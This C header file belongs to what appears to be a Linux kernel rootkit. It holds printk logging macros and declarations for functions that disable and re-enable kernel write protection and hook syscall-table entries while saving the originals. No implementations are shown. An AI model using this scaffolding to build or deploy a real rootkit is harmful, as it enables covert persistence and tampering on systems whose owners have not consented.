#ifndef ROOTKIT_UTIL_H
#define ROOTKIT_UTIL_H

#include <linux/printk.h>
#include <linux/module.h>
#include <linux/kernel.h>

// Logging helpers.

// INFO: ``fm`` is short for ``__func__`` and ``module``.
#define fm_printk(level, fmt, ...) \
    printk(level "%s.%s: " fmt,    \
           THIS_MODULE->name, __func__, ##__VA_ARGS__)

#define fm_alert(fmt, ...) \
    fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

#define fm_info(fmt, ...) \
    fm_printk(KERN_INFO, fmt, ##__VA_ARGS__)

void enable_wp(void);

void disable_wp(void);

void hook_and_save(void *base, size_t offset, void *new_ptr, void **old_ptr);

typedef long (*syscall_fun)(const struct pt_regs *regs);

#endif